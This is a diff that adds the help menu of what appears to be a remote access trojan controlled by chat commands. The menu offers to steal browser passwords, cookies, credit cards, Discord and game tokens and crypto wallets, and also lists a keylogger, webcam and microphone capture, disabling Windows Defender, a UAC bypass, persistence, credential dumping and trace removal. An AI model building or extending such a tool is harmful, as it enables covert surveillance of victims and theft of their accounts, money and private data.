@@ -1,0 +1,107 @@
+🖥️ SYSTEM:
+/shell <cmd>         Run shell command
+/admincheck           Check admin status
+/uac [cmd]           Prompt for consent (runas) and relaunch elevated, or run one elevated command
+/sysinfo             Full system info
+/whoami              User details
+/datetime            Date & time
+/shutdown            Shutdown PC
+/restart             Restart PC
+/logoff              Log off
+/lock                Lock workstation
+/sleep               Sleep mode
+/listprocess         List processes
+/prockill <name>     Kill process
+/idletime            Idle time
+/installed           Installed programs
+/services            Windows services
+/devices             Online device info
+
+📊 RECON:
+/gatherdata          get all: Discord, browser passwords, cookies, credit cards, addresses, Steam, Roblox, Valorant, Telegram, crypto wallets
+
+📁 FILES:
+/cd <path>           Change directory
+/dir                 List directory
+/currentdir          Show CWD
+/download <file>     Download file
+/upload              Upload (attach file)
+/uploadlink <u> <n>  URL download to PC
+/delete <path>       Delete file/folder
+/drives              List drives
+/search <name>       Search files
+/copy <src> <dst>    Copy file/folder
+/move <src> <dst>    Move file/folder
+/rename <old> <new>  Rename
+/mkdir <path>        Create folder
+/openfile <path>     Open file
+
+🎭 INTERACTION:
+/message <text>      Show message box
+/fakeerror <text>    Fake error dialog
+/voice <text>        TTS speak
+/write <text>        Type keyboard
+/wallpaper           Set wallpaper (attach img)
+/website <url>       Open URL in browser
+/audio               Play audio (attach file)
+/popup <n> <text>    Spam popups (max 100)
+/volumeup            Volume +10%
+/volumedown          Volume -10%
+/mute                Toggle mute
+/monitors_off        Turn off monitors
+
+📷 CAPTURE:
+/screenshot          Take screenshot
+/clipboard           Get clipboard text
+/setclipboard <txt>  Set clipboard
+/getcams             List cameras
+/selectcam <n>       Select camera
+/webcampic           Take camera picture
+/geolocate           IP geolocation
+/record <sec>        Record mic (max 120s)
+/keylog              Start keylogger (w/ window titles)
+/stopkeylog          Stop & get keylog
+
+🌐 NETWORK:
+/wifilist            Nearby WiFi networks
+/wifipasswords       Saved WiFi passwords
+/ipconfig            Network config
+/netstat             Connections
+/env                 Environment vars
+
+🔒 CONTROL:
+/blocksite <site>    Block website
+/unblocksite <site>  Unblock website
+/hidetaskbar         Hide taskbar
+/showtaskbar         Show taskbar
+/hidedesktop         Hide desktop icons
+/showdesktop         Show desktop icons
+/swap_mouse          Swap mouse buttons
+/unswap_mouse        Restore mouse buttons
+/fmouse              Freeze cursor
+/unfmouse            Unfreeze cursor
+/lockinput           Lock input (admin)
+/unlockinput         Unlock input
+
+📡 SURVEILLANCE:
+/desktopstream       Start live desktop stream
+/stopstream          Stop desktop stream
+/sharescreen         Start web screen stream
+/stopsharescreen     Stop web screen stream
+/clipwatch           Monitor clipboard changes
+/stopclipwatch       Stop clipboard monitor
+
+⚔️ OFFENSE:
+/disableav           Disable Windows Defender (admin)
+/uac                 UAC bypass → admin (NOT wired - see rat.py request_elevation)
+/selfdestruct        Self-destruct (remove all traces)
+/persist <method>    Persistence: schtask, wmi, startup, registry, all
+/pwdump              Dump stored credentials
+/bsod                Trigger BSOD (admin)
+
+🔐 CRYPTO:
+/encrypt <path> <pw> AES-256 encrypt file/folder
+/decrypt <zip> <pw>  Decrypt password-protected zip
+
+⚙️ /exit              Exit program
+─────────────────────────
